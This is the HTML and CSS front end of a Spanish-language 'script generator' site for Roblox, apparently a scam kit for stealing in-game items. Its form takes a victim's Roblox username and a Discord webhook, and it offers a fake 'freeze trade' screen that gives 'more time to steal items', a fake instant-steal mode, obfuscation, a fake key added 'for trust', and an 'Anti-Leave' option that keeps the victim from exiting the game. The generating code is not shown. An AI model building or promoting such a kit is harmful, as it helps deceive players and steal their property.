        .credit-item .avatar { width: 64px; height: 64px; border-radius: 50%; overflow: hidden; flex-shrink: 0; border: 2px solid rgba(0, 255, 255, 0.2); position: relative; z-index: 2; animation: avatar-pulse 3s ease-in-out infinite; box-shadow: 0 0 30px rgba(0, 255, 255, 0.1); }
        .credit-item .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .credit-item .info { flex: 1; position: relative; z-index: 2; }
        .credit-item .info .name { font-size: 1.2rem; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; text-shadow: 0 0 30px rgba(0, 255, 255, 0.1); }
        .credit-item .info .name .badge-creator { font-size: 0.6rem; background: linear-gradient(135deg, #00ffff, #0088ff); color: #fff; padding: 3px 12px; border-radius: 100px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 30px rgba(0, 200, 255, 0.3); animation: badge-creator-glow 2s ease-in-out infinite; }
        .credit-item .info .name .badge-dev { font-size: 0.6rem; background: linear-gradient(135deg, #ff8800, #ff4400); color: #fff; padding: 3px 12px; border-radius: 100px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 30px rgba(255, 136, 0, 0.3); animation: badge-dev-glow 2s ease-in-out infinite; }
        @keyframes badge-dev-glow { 0%, 100% { box-shadow: 0 0 30px rgba(255, 136, 0, 0.2); } 50% { box-shadow: 0 0 60px rgba(255, 136, 0, 0.5); } }
        @keyframes badge-creator-glow { 0%, 100% { box-shadow: 0 0 30px rgba(0, 200, 255, 0.2); } 50% { box-shadow: 0 0 60px rgba(0, 200, 255, 0.5); } }
        .credit-item .info .role { font-size: 0.8rem; color: rgba(255, 255, 255, 0.4); margin-top: 4px; text-shadow: 0 0 20px rgba(0, 255, 255, 0.05); }
        .credit-item .info .description { font-size: 0.85rem; color: rgba(255, 255, 255, 0.5); margin-top: 6px; line-height: 1.5; text-shadow: 0 0 20px rgba(0, 255, 255, 0.05); }
        .credit-item .actions { display: flex; flex-direction: column; gap: 8px; align-items: flex-end; position: relative; z-index: 2; }
        .credit-item .discord-link, .credit-item .server-link { display: flex; align-items: center; gap: 8px; padding: 8px 18px; border-radius: 10px; font-size: 0.75rem; font-weight: 600; text-decoration: none; transition: all 0.3s ease; white-space: nowrap; position: relative; overflow: hidden; }
        .credit-item .discord-link { background: rgba(88, 101, 242, 0.15); border: 1px solid rgba(88, 101, 242, 0.2); color: #7289da; box-shadow: 0 0 30px rgba(88, 101, 242, 0.05); }
        .credit-item .discord-link:hover { background: rgba(88, 101, 242, 0.3); transform: scale(1.05); box-shadow: 0 0 50px rgba(88, 101, 242, 0.15); border-color: rgba(88, 101, 242, 0.5); }
        .credit-item .server-link { background: rgba(52, 211, 153, 0.1); border: 1px solid rgba(52, 211, 153, 0.15); color: #34d399; box-shadow: 0 0 30px rgba(52, 211, 153, 0.03); }
        .credit-item .server-link:hover { background: rgba(52, 211, 153, 0.2); transform: scale(1.05); box-shadow: 0 0 50px rgba(52, 211, 153, 0.12); border-color: rgba(52, 211, 153, 0.4); }
        .toast { position: fixed; bottom: 20px; right: 20px; background: linear-gradient(135deg, #00ffff, #00bbff); color: #000; padding: 10px 20px; border-radius: 12px; font-size: 0.8rem; animation: slideIn 0.3s ease; z-index: 1000; font-weight: bold; box-shadow: 0 4px 25px rgba(0, 255, 255, 0.2); }
        .toast.warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; }
        .toast.error { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; }
        .toast.success { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .loading-spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(0, 255, 255, 0.2); border-top-color: #00ffff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { text-align: center; margin-top: 1.5rem; color: rgba(255, 255, 255, 0.1); font-size: 0.7rem; }
        .footer a { color: #00ffff; text-decoration: none; opacity: 0.6; transition: opacity 0.3s; }
        .footer a:hover { opacity: 1; }
        .login-notice { background: rgba(88, 101, 242, 0.06); border: 1px solid rgba(88, 101, 242, 0.15); border-radius: 14px; padding: 1.5rem; text-align: center; margin-bottom: 1.5rem; display: none; }
        .login-notice.show { display: block; }
        .login-notice .icon { font-size: 2rem; margin-bottom: 0.5rem; }
        .login-notice h3 { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 0.25rem; }
        .login-notice p { font-size: 0.85rem; color: rgba(255, 255, 255, 0.4); }
        @media (max-width: 640px) {
            .container { padding: 1rem; } .card-body { padding: 1.25rem; } .logo { font-size: 2.2rem; }
            .discord-corner { top: 8px; right: 8px; gap: 4px; }
            .discord-btn { padding: 4px 8px; font-size: 0.55rem; border-radius: 6px; gap: 4px; }
            .discord-btn svg { width: 12px; height: 12px; }
            .discord-corner .user-info .avatar-small { width: 20px; height: 20px; }
            .discord-corner .user-info .username-text { display: none; }
            .discord-btn.verified { padding: 3px 6px; font-size: 0.5rem; }
            .discord-btn.verified svg { width: 10px; height: 10px; }
            .language-selector { top: 8px; left: 8px; padding: 2px 6px; gap: 3px; }
            .language-selector button { font-size: 0.6rem; padding: 2px 5px; }
            .credits-section { flex-direction: column; text-align: center; padding: 1.2rem; gap: 12px; }
            .credit-item { flex-direction: column; text-align: center; padding: 1.2rem; gap: 12px; }
            .credit-item .avatar { width: 50px; height: 50px; }
            .credit-item .info .name { justify-content: center; font-size: 1rem; }
            .credit-item .info .role { font-size: 0.7rem; }
            .credit-item .info .description { font-size: 0.75rem; }
            .credit-item .actions { align-items: center; width: 100%; gap: 6px; }
            .credit-item .discord-link, .credit-item .server-link { width: 100%; justify-content: center; font-size: 0.7rem; padding: 6px 12px; }
            .target-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
            .target-item .thumbnail { width: 44px; height: 44px; }
            .target-item .target-name { font-size: 0.55rem; }
            .script-mode-container { grid-template-columns: 1fr 1fr; gap: 8px; }
            .mode-card { min-height: 90px; padding: 12px 8px; }
            .mode-card .mode-icon { font-size: 1.4rem; }
            .mode-card .mode-title { font-size: 0.75rem; }
            .mode-card .mode-desc { font-size: 0.6rem; }
            .fake-key-group .input-wrapper { flex-direction: column; }
            .fake-key-group .input-wrapper .user-input { width: 100%; }
            .login-card { padding: 1.8rem 1.2rem; }
            .login-card h1 { font-size: 1.4rem; }
            .login-card .avatar { width: 80px; height: 80px; }
            .login-card .discord-login-btn { font-size: 0.85rem; padding: 12px 16px; }
            .panel-quick-buttons { gap: 4px; }
            .panel-quick-btn { font-size: 0.5rem; padding: 3px 8px; }
            .panel-actions button { font-size: 0.6rem; padding: 6px; min-width: 60px; }
        }
    </style>
</head>
<body>
    <canvas id="stars-canvas"></canvas>
    <div id="glow"></div>
    <div class="login-overlay" id="loginOverlay">
        <div class="login-card">
            <div class="avatar">
                <img src="https://ik.imagekit.io/dr6z4tib7/3f9c4436df34b7011b368cdf587f047f.png?updatedAt=1785798108862" alt="CHOCOLA MOREIRA" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
            </div>
            <h1>CHOCOLA MOREIRA</h1>
            <p class="subtitle" id="loginSubtitle">Inicia sesión para generar tu script</p>
            <div class="server-badge">
                <span class="dot"></span>
                discord.gg/9WxvBKkaVF
            </div>
            <button class="discord-login-btn" id="loginOverlayBtn">
                <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                </svg>
                <span id="loginBtnText">Iniciar sesión con Discord</span>
            </button>
            <div class="login-footer">
                <a href="https://discord.gg/9WxvBKkaVF" target="_blank" class="server-link" id="joinServerLink">💬 Únete al servidor CHOCOLA MOREIRA</a>
                <div class="protected">PROTECTED BY <span>CHOCOLA</span></div>
            </div>
        </div>
    </div>
    <div class="language-selector" id="languageSelector">
        <button class="active" data-lang="es" title="Español">🇪🇸 ES</button>
        <span class="separator">|</span>
        <button data-lang="en" title="English">🇬🇧 EN</button>
        <span class="separator">|</span>
        <button data-lang="pt" title="Português">🇧🇷 PT</button>
    </div>
    <div class="discord-corner" id="discordCorner">
        <div class="user-info" id="userInfo" style="display:none;">
            <img class="avatar-small" id="userAvatar" src="" alt="">
            <span class="username-text" id="userNameText">Usuario</span>
        </div>
        <button class="discord-btn" id="discordBtn">
            <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
            </svg>
            <span id="discordBtnText">Login</span>
        </button>
    </div>
    <div class="container">
        <div class="header">
            <div class="live-badge">
                <span class="live-dot"></span>
                <span id="liveText">LIVE</span>
                <span style="color: rgba(0,255,255,0.3);">·</span>
                <span id="liveSubText">Script Generator</span>
            </div>
            <div class="logo">⚡ CHOCOLA MOREIRA</div>
            <div class="tagline" id="taglineText">Configura tu script y genéralo al instante, listo para copiar.</div>
        </div>
        <div class="card">
            <div class="card-header"><h2 id="configTitle">Configuración</h2></div>
            <div class="card-body">
                <div class="badges">
                    <span class="badge" id="badge1">⚡ Generación instantánea</span>
                    <span class="badge" id="badge2">🔒 Webhook seguro</span>
                    <span class="badge" id="badge3">🎯 3 categorías de targets</span>
                    <span class="badge" id="badge4">🛡️ Ofuscación Luraph v15.1</span>
                    <span class="badge" id="badge5">📋 Gist/Luarmor Loader</span>
                    <span class="badge" id="badge6">🛡️ Anti-Bot</span>
                    <span class="badge" id="badge7">🔑 FAKE KEY</span>
                    <span class="badge" id="badge8">✨ Nuevos Brainrots & Gears</span>
                    <span class="badge" id="badge9">🚫 Anti-Leave</span>
                </div>
                <div class="login-notice" id="loginNotice">
                    <div class="icon">🔒</div>
                    <h3 id="loginTitle">Inicio de sesión requerido</h3>
                    <p id="loginDesc">Necesitas iniciar sesión con Discord para acceder al generador de scripts.</p>
                </div>
                <div id="generatorForm">
                    <div class="form-group">
                        <label class="form-label" id="targetUsernameLabel">🎮 NOMBRE DE USUARIO DE ROBLOX</label>
                        <div class="user-search-wrapper">
                            <input type="text" class="user-input" id="usernameInput" placeholder="Buscar usuario de Roblox..." autocomplete="off" disabled>
                            <div class="user-results" id="userResults"></div>
                        </div>
                        <div class="selected-user" id="selectedUser">
                            <div class="avatar-container">
                                <img id="selectedAvatar" src="" alt="Avatar">
                            </div>
                            <div class="info">
                                <div class="name" id="selectedName">-</div>
                                <div class="id" id="selectedId">ID: -</div>
                            </div>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label" id="webhookLabel">📡 WEBHOOK</label>
                        <input type="text" class="user-input" id="webhookUrl" placeholder="Ej: https://discord.com/api/webhooks/1234567890/abcdefg" disabled>
                    </div>
                    <div class="form-group">
                        <label class="form-label" id="scriptModeLabel">🎨 MODO DE SCRIPT</label>
                        <div class="script-mode-container">
                            <div class="mode-card active disabled" data-mode="NO-GUI" data-script="logic">
                                <span class="mode-icon">⚙️</span>
                                <div class="mode-title" id="modeNoGuiTitle">NO-GUI</div>
                                <div class="mode-desc" id="modeNoGuiDesc">Sin interfaz gráfica</div>
                            </div>
                            <div class="mode-card disabled" data-mode="FREEZE" data-script="freeze">
                                <span class="mode-icon">❄️</span>
                                <div class="mode-title" id="modeFreezeTitle">UI Fake Freeze Trade</div>
                                <div class="mode-desc" id="modeFreezeDesc">UI falsa que no deja salir del juego</div>
                                <div class="mode-desc" style="color: #ff6b6b; font-weight: 500; opacity:0.8;" id="modeFreezeSub">Más tiempo para robar items</div>
                            </div>
                            <div class="mode-card disabled" data-mode="FAKE_INSTA" data-script="fakeinsta">
                                <span class="mode-icon">⚡</span>
                                <div class="mode-title" id="modeFakeInstaTitle">FAKE INSTA STEAL</div>
                                <div class="mode-desc" id="modeFakeInstaDesc">Simula robo instantáneo con UI falsa</div>
                                <div class="mode-desc" style="color: #00ffff; font-weight: 500; opacity:0.8;" id="modeFakeInstaSub">Script visual</div>
                            </div>
                            <div class="mode-card disabled" data-mode="DUELS" data-script="duels">
                                <span class="mode-icon">⚔️</span>
                                <div class="mode-title" id="modeDuelsTitle">DUELS — Vampire Hub</div>
                                <div class="mode-desc" id="modeDuelsDesc">Script de duelos</div>
                                <div class="mode-desc" style="color: #ff6b6b; font-weight: 500; opacity:0.8;" id="modeDuelsSub">Vampire Hub</div>
                            </div>
                            <div class="mode-card disabled" data-mode="CUSTOM" data-script="custom">
                                <span class="mode-icon">✏️</span>
                                <div class="mode-title" id="modeCustomTitle">CUSTOM</div>
                                <div class="mode-desc" id="modeCustomDesc">Loader personalizado</div>
                            </div>
                        </div>
                        <div class="custom-area" id="customArea">
                            <input type="text" class="user-input" id="customLoader" placeholder="Ej: loadstring(game:HttpGet('https://tu-ui.com/ui.lua'))()" disabled>
                        </div>
                    </div>
                    <div class="target-selector-wrapper" id="brainrotWrapper">
                        <div class="target-selector-header">
                            <span class="label" id="brainrotLabel">🧠 BRAINROTS</span>
                            <span class="count" id="brainrotCountLabel">0/313</span>
                        </div>
                        <div class="selected-chips" id="brainrotChips"></div>
                        <button class="target-selector-btn disabled" id="brainrotToggle">
                            <span id="brainrotSelectedLabel">Seleccionar brainrots...</span>
                            <span class="arrow">▼</span>
                        </button>
                        <div class="target-panel" id="brainrotPanel">
                            <input type="text" class="search-input" id="brainrotSearch" placeholder="Buscar brainrots..." disabled>
                            <div class="panel-quick-buttons">
                                <button class="panel-quick-btn og" id="brainrotPanelOG">⭐ OG</button>
                                <button class="panel-quick-btn secret" id="brainrotPanelSecret">🔮 Best Secret</button>
                            </div>
                            <div class="panel-actions">
                                <button id="brainrotSelectAll" disabled>Seleccionar todo</button>
                                <button id="brainrotDeselectAll" disabled>Deseleccionar</button>
                                <button class="close-btn" id="brainrotClose">Cerrar</button>
                            </div>
                            <div class="target-grid" id="brainrotGrid"></div>
                        </div>
                    </div>
                    <div class="target-selector-wrapper" id="baseskinWrapper">
                        <div class="target-selector-header">
                            <span class="label" id="baseskinLabel">🎨 BASE SKINS</span>
                            <span class="count" id="baseskinCountLabel">0/25</span>
                        </div>
                        <div class="selected-chips" id="baseskinChips"></div>
                        <button class="target-selector-btn disabled" id="baseskinToggle">
                            <span id="baseskinSelectedLabel">Seleccionar base skins...</span>
                            <span class="arrow">▼</span>
                        </button>
                        <div class="target-panel" id="baseskinPanel">
                            <input type="text" class="search-input" id="baseskinSearch" placeholder="Buscar base skins..." disabled>
                            <div class="panel-actions">
                                <button id="baseskinSelectAll" disabled>Seleccionar todo</button>
                                <button id="baseskinDeselectAll" disabled>Deseleccionar</button>
                                <button class="close-btn" id="baseskinClose">Cerrar</button>
                            </div>
                            <div class="target-grid" id="baseskinGrid"></div>
                        </div>
                    </div>
                    <div class="target-selector-wrapper" id="gearWrapper">
                        <div class="target-selector-header">
                            <span class="label" id="gearLabel">⚙️ GEARS</span>
                            <span class="count" id="gearCountLabel">0/24</span>
                        </div>
                        <div class="selected-chips" id="gearChips"></div>
                        <button class="target-selector-btn disabled" id="gearToggle">
                            <span id="gearSelectedLabel">Seleccionar gears...</span>
                            <span class="arrow">▼</span>
                        </button>
                        <div class="target-panel" id="gearPanel">
                            <input type="text" class="search-input" id="gearSearch" placeholder="Buscar gears..." disabled>
                            <div class="panel-actions">
                                <button id="gearSelectAll" disabled>Seleccionar todo</button>
                                <button id="gearDeselectAll" disabled>Deseleccionar</button>
                                <button class="close-btn" id="gearClose">Cerrar</button>
                            </div>
                            <div class="target-grid" id="gearGrid"></div>
                        </div>
                    </div>
                    <div class="toggles-container">
                        <div class="toggle-row">
                            <div class="toggle-label">
                                <p id="gistLabel">📋 Gist Loader <span class="recommended-badge">★ recomendado</span></p>
                                <p id="gistDesc">Sube el script a GitHub Gist y devuelve un loadstring seguro</p>
                            </div>
                            <button class="toggle-btn off" id="toggleGistBtn" disabled>
                                <span class="toggle-knob"></span>
                            </button>
                        </div>
                        <div class="toggle-row">
                            <div class="toggle-label">
                                <p id="luarmorLabel">📋 Luarmor Loader</p>
                                <p id="luarmorDesc">Sube el script a Luarmor y devuelve un loadstring seguro</p>
                            </div>
                            <button class="toggle-btn off" id="toggleLuarmorBtn" disabled>
                                <span class="toggle-knob"></span>
                            </button>
                        </div>
                        <div class="toggle-row">
                            <div class="toggle-label">
                                <p id="obfuscateLabel">🛡️ Luraph v15</p>
                                <p id="obfuscateDesc">Protección profesional de scripts con Luraph v15</p>
                            </div>
                            <button class="toggle-btn off" id="toggleObfuscateBtn" disabled>
                                <span class="toggle-knob"></span>
                            </button>
                        </div>
                        <div class="toggle-row">
                            <div class="toggle-label">
                                <p id="fakeKeyLabel">🔑 FAKE KEY</p>
                                <p id="fakeKeyDesc">Añade una key falsa al inicio del script para confianza</p>
                            </div>
                            <button class="toggle-btn off" id="toggleFakeKeyBtn" disabled>
                                <span class="toggle-knob"></span>
                            </button>
                        </div>
                        <div class="toggle-row">
                            <div class="toggle-label">
                                <p id="antiLeaveLabel">🚫 Anti-Leave</p>
                                <p id="antiLeaveDesc">Evita que la víctima salga del juego</p>
                            </div>
                            <button class="toggle-btn off" id="toggleAntiLeaveBtn" disabled>
                                <span class="toggle-knob"></span>
                            </button>
                        </div>
                    </div>
                    <div class="fake-key-group" id="fakeKeyGroup">
                        <div class="input-wrapper">
                            <input type="text" class="user-input" id="fakeKeyInput" placeholder="FREE-4a5f4g4nto8" value="" disabled>
                        </div>
                        <div class="key-hint" id="fakeKeyHint">
                            ⚡ Ejemplo: <span class="highlight">FREE-4a5f4g4nto8</span> · Esta key aparecerá como <span class="highlight">script_key = "tu_key"</span> en el script
                        </div>
                    </div>
                    <div class="form-group" id="scriptNameGroup" style="opacity: 0.5;">
                        <label class="form-label" id="scriptNameLabel">📝 NOMBRE DE TU SCRIPT EN GIST</label>
                        <input type="text" class="user-input" id="scriptNameInput" placeholder="Ej: MiSuperScript" value="" disabled>
                        <div class="script-name-hint" id="scriptNameHint">
                            ⚡ Activa <span class="highlight">Gist Loader</span> para personalizar el nombre
                        </div>
                    </div>
                    <input type="text" name="website" tabindex="-1" autocomplete="off" style="position:absolute;left:-9999px;opacity:0;height:0;width:0"/>
                    <button class="generate-btn" id="generateBtn" disabled>🔒 INICIO DE SESIÓN REQUERIDO</button>
                    <div class="result" id="result">
                        <div class="result-header">
                            <span id="resultTitle">📜 Script generado</span>
                            <button class="copy-btn" id="copyBtn">Copiar</button>
                        </div>
                        <pre class="script-box" id="scriptOutput"></pre>
                    </div>
                </div>
            </div>
        </div>
        <div class="credits-section">
            <div class="credit-item">
                <div class="avatar">
                    <img src="https://ik.imagekit.io/dr6z4tib7/image.png" alt="Chocola" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                </div>
                <div class="info">
                    <div class="name">
                        Chocola
                        <span class="badge-creator">⭐ CREATOR</span>
                    </div>
                    <div class="role" id="creatorRole">👑 Desarrollador & Fundador</div>
                    <div class="description" id="creatorDesc">Creado y mantenido CHOCOLA MOREIRA — el generador de scripts definitivo para Roblox.</div>
                </div>
                <div class="actions">
                    <a href="https://discord.com/users/1447455403926491136" target="_blank" rel="noopener noreferrer" class="discord-link">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                            <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                        </svg>
                        @Chocola
                    </a>
                    <a href="https://discord.gg/9WxvBKkaVF" target="_blank" rel="noopener noreferrer" class="server-link">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                            <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                        </svg>
                        Join Server
                    </a>
                </div>
            </div>
            <div class="credit-item">
                <div class="avatar">
                    <img src="https://ik.imagekit.io/dr6z4tib7/d2b11260ef4b0996146a315c91c1bd46.webp" alt="LKZ" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                </div>
                <div class="info">
                    <div class="name">
                        LKZ
                        <span class="badge-dev">💻 DEV</span>
                    </div>
                    <div class="role">🛠️ Programador & Colaborador</div>
                    <div class="description">Desarrollador principal del sistema de generación de scripts y optimización del backend.</div>
                </div>
                <div class="actions">
                    <a href="https://discord.com/users/1325756909210501231" target="_blank" rel="noopener noreferrer" class="discord-link">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                            <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                        </svg>
                        @lkz
                    </a>
                    <a href="https://discord.gg/RVFUypzgHP" target="_blank" rel="noopener noreferrer" class="server-link">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                            <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
                        </svg>
                        Join Server
                    </a>
                </div>
            </div>
        </div>
        <div class="footer"><a href="https://discord.gg/9WxvBKkaVF" target="_blank" id="footerLink">💬 Únete a CHOCOLA MOREIRA para soporte y actualizaciones</a></div>
    </div>
    <script>
        // ===== FONDO DE ESTRELLAS =====
        (function() {
            const canvas = document.getElementById('stars-canvas');
            const ctx = canvas.getContext('2d');
            let width, height;
            const stars = [];
            const NUM_STARS = 180;
            function resize() { width = canvas.width = window.innerWidth; height = canvas.height = window.innerHeight; }
            window.addEventListener('resize', resize); resize();
            class Star {
                constructor() { this.reset(); }
                reset() {
                    this.x = Math.random() * width; this.y = Math.random() * height - height;
                    this.size = Math.random() * 2.5 + 0.5; this.speed = Math.random() * 1.5 + 0.5;
                    this.opacity = Math.random() * 0.5 + 0.2; this.trail = Math.random() > 0.7;
                    this.hue = 180 + Math.random() * 40;
                }
                update() { this.y += this.speed; if (this.y > height) { this.reset(); this.y = -this.size; } if (this.trail) { this.opacity = Math.random() * 0.3 + 0.2; } }
                draw() {
                    ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = `hsla(${this.hue}, 80%, 70%, ${this.opacity})`; ctx.fill();
                    if (this.size > 1.5) { ctx.shadowBlur = 10; ctx.shadowColor = `hsla(${this.hue}, 80%, 70%, ${this.opacity * 0.3})`; ctx.fill(); ctx.shadowBlur = 0; }
                }
            }
            for (let i = 0; i < NUM_STARS; i++) { stars.push(new Star()); }
            function animate() { ctx.clearRect(0, 0, width, height); stars.forEach(s => { s.update(); s.draw(); }); requestAnimationFrame(animate); }
            animate();
        })();

